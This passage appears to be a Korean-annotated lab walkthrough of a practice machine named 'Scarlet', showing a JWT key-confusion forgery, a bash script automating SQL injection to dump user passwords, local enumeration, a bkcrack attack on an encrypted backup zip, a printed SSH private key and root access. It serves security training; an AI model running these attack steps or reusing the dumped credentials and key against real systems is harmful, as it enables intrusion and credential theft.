 Version 2.3.0                \______|             @ticarpi

/home/kali/.jwt_tool/jwtconf.ini
Original JWT:

File loaded: /tmp/nfs/essentials/public.key
jwttool_4b7e45322c4a8c1369bbc897802941d9 - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJyaWFuJyIsImlhdCI6MTc4NzExOTg2Nn0.dtHpmGbUz1bqiGIEA0JRFMQoR6YDwrxQzuVMiCK5idI

┌──(kali㉿kali)-[~/git/jwt_tool]
└─$ curl -s http://scarlet.local/portal -H "Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImJyaWFuJyIsImlhdCI6MTc4NzExOTg2Nn0.dtHpmGbUz1bqiGIEA0JRFMQoR6YDwrxQzuVMiCK5idI"
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: SQLITE_ERROR: unrecognized token: &quot;&#39;brian&#39;&#39;&quot;</pre>
</body>
</html>
```

SQLi 전체 스크립트
```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ cat scarlet_all.sh
#!/bin/bash
# scarlet_all.sh — JWT key-confusion SQLi 전자동 덤프
ORIG="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjRsZWFmIiwiaWF0IjoxNzg3MTE5ODY2fQ.CAOSvdGhpsxp6RTMguLf5wrRDsZWA-ewNHuGHW2D66Tat-sJiXl_jbJ2Wd7du_mW-GskiayTlG3FYhtm2wN5TKpavfDeHgFdJs91spCHXaUVP5TPFijeWKvI2Cf3Xf967xZP6PyjWInXB_jxVo_xGV3lM_Q_fMfbBUSQq0tKayJQgVkPVEsPmEvF-U1GRE0bj__ijqTXyrJXVv0HkXylB6g9-Gm_ersY5WKZgsRlVsnh42a550JmWguWzc6zX82lY1g7pfjOKuW7Iez5yP2DMr1v9R5kpelycbOaeNMUOpewXrUwHOV7fBtwZJEAmLosD27vW9xU_WwWd9k35oujrKovIesaMadGQ2KHPvvRyiR4HudvjRk-HLESZrFKQCY7LE-meuEiI8zvWaFTGJtAyCNkWk8CLEYCjmhtpqG8N_tqdUFWIMgyCszj8A2JedMVVMnt5LD7jHqw3Y7ki3fUEmSAwJnmZSFlCR8HZjVYVeL4b5w9MGeI5BXolhi6_RPOQPxeCT6jC5CZJmfz6KdSj8bEON5HN3Gk8It_AFQBokbxO95VFZpCdx2bySWfOX8BKIg1JRZiE-rsbwEXNGnh8ZhkBqkzJsXQ4PUOuABYsxxkpptjPrpH-xzq5nsqFzGcSHRIa2KgYZ_xQp59e3y7xYBHbLjqrsBwl_4gv__VRoo"
JT="/home/kali/git/jwt_tool/jwt_tool.py"
PK="/tmp/nfs/essentials/public.key"
URL="http://scarlet.local/portal"

# username 자리에 payload 주입 → 1번 컬럼 반사값만 추출
inject() {
  local token
  token=$(python "$JT" "$ORIG" -X k -pk "$PK" -I -pc username -pv "$1" 2>/dev/null | grep -oP '(?<=\[\+\] )ey[A-Za-z0-9._-]+')
  curl -s "$URL" -H "Cookie: session=$token" | grep -oP '(?<=<strong>Hey ).*?(?=, <br>)'
}

echo "=== [1] 전체 스키마 (모든 테이블 CREATE 문) ==="
inject "zzz' UNION SELECT group_concat(sql,' ||| '),2,3 FROM sqlite_master WHERE type='table'-- -"

echo -e "\n=== [2] 테이블 이름 목록 ==="
TABLES=$(inject "zzz' UNION SELECT group_concat(name,' '),2,3 FROM sqlite_master WHERE type='table'-- -")
echo "$TABLES"

echo -e "\n=== [3] users로 추정되는 테이블 전체 덤프 시도 ==="
# 흔한 사용자 테이블/컬럼 조합 자동 순회
for tbl in users user accounts members authors admin; do
  for pair in "username||':'||password" "user||':'||pass" "name||':'||password" "email||':'||password" "username||':'||pass"; do
    res=$(inject "zzz' UNION SELECT group_concat($pair,'  '),2,3 FROM $tbl-- -")
    if [ -n "$res" ] && ! echo "$res" | grep -qi "error\|no such"; then
      echo "[+] $tbl ($pair):"
      echo "    $res"
    fi
  done
done

echo -e "\n=== [4] 위에서 안 나오면 [1]의 스키마를 보고 수동으로 컬럼명 맞춰야 함 ==="
```

결과
```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ./scarlet_all.sh
=== [1] 전체 스키마 (모든 테이블 CREATE 문) ===

=== [2] 테이블 이름 목록 ===
users sqlite_sequence

=== [3] users로 추정되는 테이블 전체 덤프 시도 ===
[+] users (username||':'||password):
    brian:Standingbytheseaside12  4leaf:password1

=== [4] 위에서 안 나오면 [1]의 스키마를 보고 수동으로 컬럼명 맞춰야 함 ===

```

획득한 자격증명으로 로그인
```bash
┌──(kali㉿kali)-[~]
└─$ ssh brian@192.168.248.222
The authenticity of host '192.168.248.222 (192.168.248.222)' can't be established.
ED25519 key fingerprint is: SHA256:EcFUQ3abooLm3ZmBChJ1yx8VqJ5nj/Htk22+PfBdxUo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.248.222' (ED25519) to the list of known hosts.
brian@192.168.248.222's password:
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 19 07:15:36 AM UTC 2026

  System load:  0.0               Processes:               231
  Usage of /:   59.4% of 9.75GB   Users logged in:         0
  Memory usage: 35%               IPv4 address for ens160: 192.168.248.222
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

27 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

*** System restart required ***

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ ls
local.txt  web
$ cat lo
cat: lo: No such file or directory
$ cat local.txt
95d749deeb0864d9ebd76f2e212788b7
```

쉘안정화
```bash
/bin/bash -i
```

정보 수집
```bash
brian@scarlet:~$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/mnt/share *(rw,sync,no_subtree_check)
brian@scarlet:~$ find / -perm -4000 -type f 2>/dev/null
/snap/snapd/16010/usr/lib/snapd/snap-confine
/snap/snapd/16292/usr/lib/snapd/snap-confine
/snap/core20/1611/usr/bin/chfn
/snap/core20/1611/usr/bin/chsh
/snap/core20/1611/usr/bin/gpasswd
/snap/core20/1611/usr/bin/mount
/snap/core20/1611/usr/bin/newgrp
/snap/core20/1611/usr/bin/passwd
/snap/core20/1611/usr/bin/su
/snap/core20/1611/usr/bin/sudo
/snap/core20/1611/usr/bin/umount
/snap/core20/1611/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1611/usr/lib/openssh/ssh-keysign
/snap/core20/1518/usr/bin/chfn
/snap/core20/1518/usr/bin/chsh
/snap/core20/1518/usr/bin/gpasswd
/snap/core20/1518/usr/bin/mount
/snap/core20/1518/usr/bin/newgrp
/snap/core20/1518/usr/bin/passwd
/snap/core20/1518/usr/bin/su
/snap/core20/1518/usr/bin/sudo
/snap/core20/1518/usr/bin/umount
/snap/core20/1518/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1518/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/fusermount3
/usr/bin/umount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/sudo
/usr/sbin/mount.nfs
brian@scarlet:~$ getcap -r / 2>/dev/null
/snap/core20/1611/usr/bin/ping cap_net_raw=ep
/snap/core20/1518/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
brian@scarlet:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
brian@scarlet:~$ ls -la /etc/cron.d/ 2>/dev/null
total 16
drwxr-xr-x   2 root root 4096 Jun 16  2022 .
drwxr-xr-x 104 root root 4096 Feb 20  2025 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
```

```bash
brian@scarlet:~$ ps aux | grep -i node | grep -v grep
find / -name "app.js" -o -name "server.js" 2>/dev/null | grep -vE "node_modules|snap"
find / -name "*.db" -o -name "*.sqlite*" 2>/dev/null | grep -v snap
ls -la /var/www /opt /srv 2>/dev/null
brian       1199  2.0  3.3 915192 68716 ?        Ssl  02:16   6:19 node /home/brian/web/index.js
/var/cache/man/pt_BR/index.db
/var/cache/man/zh_CN/index.db
/var/cache/man/ro/index.db
/var/cache/man/ko/index.db
/var/cache/man/hu/index.db
/var/cache/man/pl/index.db
/var/cache/man/id/index.db
/var/cache/man/sr/index.db
/var/cache/man/de/index.db
/var/cache/man/es/index.db
/var/cache/man/ru/index.db
/var/cache/man/index.db
/var/cache/man/sl/index.db
/var/cache/man/pt/index.db
/var/cache/man/nl/index.db
/var/cache/man/sv/index.db
/var/cache/man/tr/index.db
/var/cache/man/cs/index.db
/var/cache/man/ja/index.db
/var/cache/man/fi/index.db
/var/cache/man/uk/index.db
/var/cache/man/it/index.db
/var/cache/man/da/index.db
/var/cache/man/zh_TW/index.db
/var/cache/man/fr/index.db
/var/lib/command-not-found/commands.db
/var/lib/PackageKit/transactions.db
/usr/share/mime/application/vnd.sqlite3.xml
/usr/lib/firmware/regulatory.db
/home/brian/web/database.db
/opt:
total 3484
drwxr-xr-x  2 root  root     4096 Jul 18  2022 .
drwxr-xr-x 19 root  root     4096 Jun 15  2022 ..
-rw-r--r--  1 brian brian 3557636 Jul 17  2022 backup.zip

/srv:
total 8
drwxr-xr-x  2 root root 4096 Apr 21  2022 .
drwxr-xr-x 19 root root 4096 Jun 15  2022 ..

/var/www:
total 12
drwxr-xr-x  3 root root 4096 Jul 18  2022 .
drwxr-xr-x 14 root root 4096 Jul 18  2022 ..
drwxr-xr-x  2 root root 4096 Jul 18  2022 html
```

키 발견
```bash
brian@scarlet:/tmp/bk$ python3 -c "import zipfile; z=zipfile.ZipFile('backup.zip'); print('\n'.join(z.namelist()))" | head -60
ssh-keys/
ssh-keys/id_rsa
web/
web/middleware/
web/middleware/AuthMiddleware.js
web/css/
web/css/style.css
web/scarlet.local
web/public.key
web/index.js
web/default
web/private.key
web/package.json
web/views/
web/views/index.html
web/views/login.html
web/views/portal.html
web/assets/
web/assets/smoothscroll/
web/assets/smoothscroll/smooth-scroll.js
web/assets/dropdown/
web/assets/dropdown/css/
web/assets/dropdown/css/style.css
web/assets/dropdown/js/
web/assets/dropdown/js/navbar-dropdown.js
web/assets/formoid/
web/assets/formoid/formoid.min.js
web/assets/bootstrap/
web/assets/bootstrap/css/
web/assets/bootstrap/css/bootstrap.min.css
web/assets/bootstrap/css/bootstrap-grid.min.css
web/assets/bootstrap/css/bootstrap-reboot.min.css
web/assets/bootstrap/js/
web/assets/bootstrap/js/bootstrap.bundle.min.js
web/assets/mobirise/
web/assets/mobirise/css/
web/assets/mobirise/css/mbr-additional.css
web/assets/images/
web/assets/images/mbr-9.jpg
web/assets/images/mbr-1920x1278.jpg
web/assets/images/mbr-10.jpg
web/assets/images/linkedin-sales-solutions-pata8xe-ivm-unsplash.jpg
web/assets/images/hashes.json
web/assets/images/ali-morshedlou-wmd64tmfc4k-unsplash.jpg
web/assets/images/mbr.png
web/assets/images/mbr-3.jpg
web/assets/images/mbr-3.jpeg
web/assets/images/mbr-2.jpg
web/assets/images/dan-cornilov-ehuyu820lca-unsplash.jpg
web/assets/images/mbr-6.jpg
web/assets/web/
web/assets/web/assets/
web/assets/web/assets/mobirise-icons2/
web/assets/web/assets/mobirise-icons2/mobirise2.woff
web/assets/web/assets/mobirise-icons2/mobirise2.eot
web/assets/web/assets/mobirise-icons2/mobirise2.ttf
web/assets/web/assets/mobirise-icons2/mobirise2.svg
web/assets/web/assets/mobirise-icons2/mobirise2.css
web/assets/socicon/
web/assets/socicon/css/
```

zip 다운로드
```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ scp brian@192.168.248.222:/opt/backup.zip .
brian@192.168.248.222's password:
backup.zip                                                          100% 3474KB   1.4MB/s   00:02
```

내부 키 복구
```bash
┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ cd ~/git/bkcrack/build/src/cli

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ls ~/git/bkcrack/tools/
deflate.py  inflate.py

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ python3 ~/git/bkcrack/tools/deflate.py < /tmp/nfs/essentials/public.key > pub.deflate

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ./bkcrack -C ~/PG/Scarlet/backup.zip -c web/public.key -p pub.deflate
bkcrack 1.8.1 - 2025-10-25
[16:32:24] Z reduction using 623 bytes of known plaintext
100.0 % (623 / 623)
[16:32:24] Attack on 14181 Z values at index 10
Keys: c45cce0e 772c014e 98bbd8be
32.3 % (4575 / 14181)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 4575
[16:32:29] Keys
c45cce0e 772c014e 98bbd8be
```

키 확인
```bash
┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ./bkcrack -C ~/PG/Scarlet/backup.zip \
  -k c45cce0e 772c014e 98bbd8be \
  -D decrypted.zip
bkcrack 1.8.1 - 2025-10-25
[16:33:10] Writing decrypted archive decrypted.zip
100.0 % (53 / 53)

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ ls
bkcrack  CMakeFiles  cmake_install.cmake  decrypted.zip  libbkcrack-cli.a  Makefile  pub.deflate

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ unzip decrypted.zip -d out
Archive:  decrypted.zip
   creating: out/ssh-keys/
  inflating: out/ssh-keys/id_rsa
   creating: out/web/
   creating: out/web/middleware/
  inflating: out/web/middleware/AuthMiddleware.js
   creating: out/web/css/
  inflating: out/web/css/style.css
  inflating: out/web/scarlet.local
  inflating: out/web/public.key
  inflating: out/web/index.js
  inflating: out/web/default
  inflating: out/web/private.key
  inflating: out/web/package.json
   creating: out/web/views/
  inflating: out/web/views/index.html
  inflating: out/web/views/login.html
  inflating: out/web/views/portal.html
   creating: out/web/assets/
   creating: out/web/assets/smoothscroll/
  inflating: out/web/assets/smoothscroll/smooth-scroll.js
   creating: out/web/assets/dropdown/
   creating: out/web/assets/dropdown/css/
  inflating: out/web/assets/dropdown/css/style.css
   creating: out/web/assets/dropdown/js/
  inflating: out/web/assets/dropdown/js/navbar-dropdown.js
   creating: out/web/assets/formoid/
  inflating: out/web/assets/formoid/formoid.min.js
   creating: out/web/assets/bootstrap/
   creating: out/web/assets/bootstrap/css/
  inflating: out/web/assets/bootstrap/css/bootstrap.min.css
  inflating: out/web/assets/bootstrap/css/bootstrap-grid.min.css
  inflating: out/web/assets/bootstrap/css/bootstrap-reboot.min.css
   creating: out/web/assets/bootstrap/js/
  inflating: out/web/assets/bootstrap/js/bootstrap.bundle.min.js
   creating: out/web/assets/mobirise/
   creating: out/web/assets/mobirise/css/
  inflating: out/web/assets/mobirise/css/mbr-additional.css
   creating: out/web/assets/images/
  inflating: out/web/assets/images/mbr-9.jpg
  inflating: out/web/assets/images/mbr-1920x1278.jpg
  inflating: out/web/assets/images/mbr-10.jpg
  inflating: out/web/assets/images/linkedin-sales-solutions-pata8xe-ivm-unsplash.jpg
  inflating: out/web/assets/images/hashes.json
  inflating: out/web/assets/images/ali-morshedlou-wmd64tmfc4k-unsplash.jpg
  inflating: out/web/assets/images/mbr.png
  inflating: out/web/assets/images/mbr-3.jpg
  inflating: out/web/assets/images/mbr-3.jpeg
  inflating: out/web/assets/images/mbr-2.jpg
  inflating: out/web/assets/images/dan-cornilov-ehuyu820lca-unsplash.jpg
  inflating: out/web/assets/images/mbr-6.jpg
   creating: out/web/assets/web/
   creating: out/web/assets/web/assets/
   creating: out/web/assets/web/assets/mobirise-icons2/
  inflating: out/web/assets/web/assets/mobirise-icons2/mobirise2.woff
  inflating: out/web/assets/web/assets/mobirise-icons2/mobirise2.eot
  inflating: out/web/assets/web/assets/mobirise-icons2/mobirise2.ttf
  inflating: out/web/assets/web/assets/mobirise-icons2/mobirise2.svg
  inflating: out/web/assets/web/assets/mobirise-icons2/mobirise2.css
   creating: out/web/assets/socicon/
   creating: out/web/assets/socicon/css/
  inflating: out/web/assets/socicon/css/styles.css
   creating: out/web/assets/socicon/fonts/
  inflating: out/web/assets/socicon/fonts/socicon.svg
  inflating: out/web/assets/socicon/fonts/socicon.woff
  inflating: out/web/assets/socicon/fonts/socicon.woff2
  inflating: out/web/assets/socicon/fonts/socicon.ttf
  inflating: out/web/assets/socicon/fonts/socicon.eot
   creating: out/web/assets/parallax/
  inflating: out/web/assets/parallax/jarallax.js
  inflating: out/web/assets/parallax/jarallax.css
   creating: out/web/assets/theme/
   creating: out/web/assets/theme/css/
  inflating: out/web/assets/theme/css/style.css
   creating: out/web/assets/theme/js/
  inflating: out/web/assets/theme/js/script.js
   creating: out/web/assets/sociallikes/
  inflating: out/web/assets/sociallikes/social-likes.js
   creating: out/web/routes/
  inflating: out/web/routes/index.js
   creating: out/web/helpers/
  inflating: out/web/helpers/JWTHelper.js
  inflating: out/web/helpers/DBHelper.js
  inflating: out/web/database.db

┌──(kali㉿kali)-[~/…/bkcrack/build/src/cli]
└─$ cat out/ssh-keys/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```


id_rsa 사용하여 flag 획득
```bash
┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ vi keykey

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ chmod 600 keykey

┌──(kali㉿kali)-[~/PG/Scarlet]
└─$ ssh -i keykey root@192.168.248.222
Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 19 07:34:18 AM UTC 2026

  System load:  0.0               Processes:               237
  Usage of /:   59.4% of 9.75GB   Users logged in:         1
  Memory usage: 38%               IPv4 address for ens160: 192.168.248.222
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

27 updates can be applied immediately.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


*** System restart required ***
Last login: Fri Aug 26 02:36:00 2022
root@scarlet:~# ls
proof.txt  snap
root@scarlet:~# cat proof.txt
07e450d973658eaa9fe028265ba6b784
```